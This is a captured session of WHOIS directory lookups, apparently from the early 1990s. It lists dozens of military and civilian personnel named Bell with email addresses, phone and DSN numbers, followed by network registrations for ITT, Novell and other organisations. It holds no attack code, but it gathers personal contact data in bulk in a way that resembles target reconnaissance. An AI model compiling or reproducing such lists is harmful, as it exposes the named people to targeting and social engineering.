                                                 (618) 256-2795 (DSN) 576-2795
Bell, Leo (LB82)                asqg-fs-cc-1sg@HUACHUCA-EMH2.ARMY.MIL
                                                 (602) 533-3304 (DSN) 821-3304
Bell, Leo (LB89)                                                (217) 767-1640
Bell, Leotis (LB47)             SSO@ST-LOUIS-EMH4.ARMY.MIL            337-5372
Bell, Linda L. (LLB7)           sgrd-uwx@HEIDELBERG-EMH2.ARMY.MIL(AV) 370-2626
Bell, Linda R. (LB64)           lbell@ST-LOUIS-EMH2.ARMY.MIL
                                  (314) 331-4282 (DSN) 555-4282 (FTS) 262-4282
Bell, Lori (LB68)               amsta-ft@TACOM-EMH1.ARMY.MIL
                                                 (313) 574-6146 (DSN) 786-6146
Bell, M. (MB43)                                  (202) 697-6171 (DSN) 227-6171
Bell, Mable (MB103)                              (708) 926-5406 (DSN) 459-5406
Bell, Marion (MB70)             laojapan@WSMR-EMH01.ARMY.MIL    (DSN) 635-3293
Bell, Mark A. (MAB68)           aetlgvmainttech@BAUMHOLDER-EMH1.ARMY.MIL
                                                                      453-9542
Bell, Mark G. (MGB19)           BELLM%wo2@WORMS-EMH1.ARMY.MIL   (DSN) 383-7554
Bell, Mary (MB234)              CAS14@PENTAGON-AMSNET.ARMY.MIL
                                                 (703) 685-3782 (DSN) 225-2353
Bell, Maurice (MB72)            319LGLGLMT@STRATHOST.STRATCOM.AF.MIL
                                                 (701) 747-5945 (DSN) 362-5945
Bell, Melvin (MB492)            EANC-EN-DOM@TAEGU-EMH1.ARMY.MIL       768-8718
Bell, Michael (MB291)           BELLMI@WWC1.WWC.EDU             (509) 527-2307
Bell, Michael (MB308)                                           (302) 453-4540
Bell, Michael A. (MAB37)        VQ21ROTA@CPO-LINK-GW.EUCOM.MIL
                                                  34-56-82-2228 (DSN) 727-2228
Bell, Michelle (MB314)          mbell@APG-EMH5.APG.ARMY.MIL
                                                 (301) 671-3161 (DSN) 584-3161
Bell, Michelle D. (MDB16)       MCCSGPM@STRATHOST.STRATCOM.AF.MIL
                                                 (316) 652-5108 (DSN) 743-5108
Bell, Milton (MB456)            pasb-im@FTSMHSTN-HSC.ARMY.MIL
                                                 (512) 221-0780 (DSN) 471-0780
Bell, Nicholas D. (NDB2)        EAID-AT-CH@CASEY-EMH1.ARMY.MIL  (DSN) 732-5509
Bell, Norman S. (BS286)         700TAS@ACFP.AF.MIL              (404) 421-5200
Bell, Norris (NB20)             aetvthorr1@BAUMHOLDER-EMH1.ARMY.MIL   485-6581
Bell, Pauline (PB195)           pbell@PICA.ARMY.MIL              (DSN)584-4385
Bell, Phyllis V. (PVB2)         aetvtfkscc@HANAU-EMH1.ARMY.MIL
                                                +49 06181-71238 (DSN) 322-8890
Bell, Rachelle L. (RLB21)       E451@DTVMS1.DT.NAVY.MIL         (202) 586-4109
Bell, Ralph H. (RHB4)           BELLR@ALD-IIS.AF.MIL
                                                 (513) 255-2734 (DSN) 785-2734
Bell, Richard (RB358)           RBELL@DDOU.DLA.MIL
                                                 (801) 399-7101 (DSN) 790-7302
Bell, Richard (RB567)           rbell@BCGUNT.AF.MIL
                                                 (205) 279-4758 (DSN) 596-4758
Bell, Richard A. (RAB77)        usafesmo@RAMSTEIN2-EMH.AF.MIL   (DSN) 480-6293
Bell, Richard E. (REB19)        BELLR@V3.HANSCOM.AF.MIL
                                                 (617) 377-8926 (DSN) 478-8926
Bell, Richard L. (RLB151)       rbell@WSMR-EMH15.ARMY.MIL
                                                 (505) 679-4436 (DSN) 349-4436
Bell, Rickey W. (RWB6)          AETTGMP@GRAFENWOEH-EMH1.ARMY.MIL
                                                    (ETS) 475-8319 or 475-6319
Bell, Robert (RB224)            afzs-da-b@DRUM-EMH1.ARMY.MIL
                                                 (315) 772-4764 (DSN) 341-4764
Bell, Robert (RB325)            bell@TECNET1.JCTE.JCS.MIL
                                                 (804) 444-5598 (DSN) 564-5598
Bell, Robert A. (RB310)         rbell@TECNET1.JCTE.JCS.MIL      (301) 278-7882
Bell, Robert C. (RCB53)         asqe-y-s3@HEIDELBERG-EMH2.ARMY.MIL
                                                            (AV) 370-8770/7044
Bell, Robert E. (REB46)         BELL@HQHSD.BROOKS.AF.MIL
                                                 (512) 536-3272 (DSN) 240-3272
Bell, Robert S. (RSB30)         fiiu2@TECNET1.JCTE.JCS.MIL
                                                 (919) 466-2889 (DSN) 582-2889
Bell, Ronald (RLB24)            ronbell@MANTA.NOSC.MIL          (619) 553-3563
Bell, Russel J. (RJB99)         96WGLGLMPC@STRATHOST.STRATCOM.AF.MIL
                                                 (915) 696-2588 (DSN) 461-2588
Bell, Steve (SHB3)              SSO@ST-LOUIS-EMH4.ARMY.MIL            337-5372
Bell, Stoughton (SB146)         sto@UNMVAX.CS.UNM.EDU           (505) 277-3112
Bell, Stuart (SB14)             STU@MWUNIX.MITRE.ORG            (703) 883-6000
Bell, Suzanne S. (SSB4)         SSBWML@RITVAX.ISC.RIT.EDU       (716) 475-6009
Bell, Sylvester (SB335)         1ECRGDET1@STRATHOST.STRATCOM.AF.MIL
                                                 (719) 384-4419 (DSN) 692-4126
Bell, Terrence (TB15)           bellt@HUACHUCA-EMH2.ARMY.MIL
                                                 (602) 538-6666 (DSN) 879-6666
Bell, Thomas (TB180)            tebell@REDSTONE-EMH2.ARMY.MIL   (DSN) 876-8475
Bell, Thomas T. (TB190)         bell@FLOUNDER.NOSC.MIL          (619) 553-5791
Bell, Timothy (TWB16)           icacc@TACHOST.AF.MIL            (DSN) 450-7635
Bell, Vance L. (VLB10)                                          (DSN) 459-3611
Bell, Virginia (VB11)           ASQP-NAS-ID-07@ZAMA-EMH1.ARMY.MIL     263-4060
Bell, Walter D. (WDB5)          HC916@S5.INFO.WPAFB.AF.MIL       (AV) 488-5105
Bell, Wanda F. (WFB22)          wbell@DDMTG2.DDMT.DLA.MIL
                                                 (606) 293-3436 (DSN) 745-3436
Bell, William H. (WHB25)        wbell@FTBELVOR-AMEDD.ARMY.MIL
                                                 (703) 664-1472 (DSN) 354-1472
Bell, William N. (WNB5)         WNBell@DOCKMASTER.NCSC.MIL      (202) 373-8386
Bell, William R. (WRB33)        BELLR@ALD-IIS.AF.MIL
                                                 (513) 255-2734 (DSN) 785-2734
Bell, Yolanda Y. (YYB2)         aett-doim@GRAFENWOEH-EMH1.ARMY.MIL
                                                          (01149) 9641-83-8410
Woodworth, Margaret (MW78)      BELL@AFGL-VAX.AF.MIL(617) 377-2061 or 274-6002
Whois: iti
Industrial Technology Institute (NET-ITI)
   P.O.Box 1485
   Ann Arbor, MI 48130

   Netname: ITI
   Netnumber: 192.153.162.0

   Record last updated on 02-Apr-92.

Would you like to see the known hosts on this network? y


   No hosts found on this network.
Whois: itt
ITT Aerospace/Communications Division (NET-ITTACDNET) ITTACDNET    151.190.0.0
ITT Automotive, Inc. (NET-ITT-AUTO-INC) ITT-AUTO-INC              192.160.38.0
ITT Avionics (NET-AVDN)         AVDN                              192.206.54.0
ITT Avionics (NET-AVUX)         AVUX                              192.206.53.0
ITT Defense, ITT Aerospace/Communications Div. (ITT-DOM)               ITT.COM
There are 6 more matches.  Show them? y
ITT Hartford, Technical INfrastructure & Support (NET-ITTHARTFORD) ITTHARTFORD
                                                                   157.209.0.0
ITT Intermetall (NET-ITT-SEMICON) ITT-SEMICON                     192.42.253.0
ITT Rayonier Inc. (NET-ITT-RAYONIER) ITT-RAYONIER                   159.69.0.0
ITT Semiconductors (NET-ITT-SEMICON2) ITT-SEMICON2                192.48.251.0
ITT Semiconductors (NET-ITT-SEMICON3) ITT-SEMICON3                192.48.252.0
ITT Sheraton Corporation (NET-SHERATON) SHERATON                    155.72.0.0
Whois: lantern
Novell, Inc. (NET-LANTERN)
   2180 Fortune Drive
   San Jose, CA 95131

   Netname: LANTERN
   Netnumber: 192.68.205.0

   Coordinator:
      Bostock, Steve  (SB282)  steveb@NOVELL.COM
      (408) 473-8203

   Record last updated on 03-Jan-91.

Would you like to see the known hosts on this network? y


   No hosts found on this network.
Whois: carot
No match for "CAROT".
Whois: sentry
VSHIC Test Systems (NET-SENTRY)
   Advanced Products Group
   1725 Technology Drive
   San Jose, CA 95115

   Netname: SENTRY
   Netnumber: 192.12.142.0

   Coordinator:
      Bashinski, John  (JB348)  JBASH@VELVET.COM
      (415) 829-8652

   Record last updated on 03-Jan-91.

Would you like to see the known hosts on this network? y


   No hosts found on this network.
Whois: 
@ 
@ exit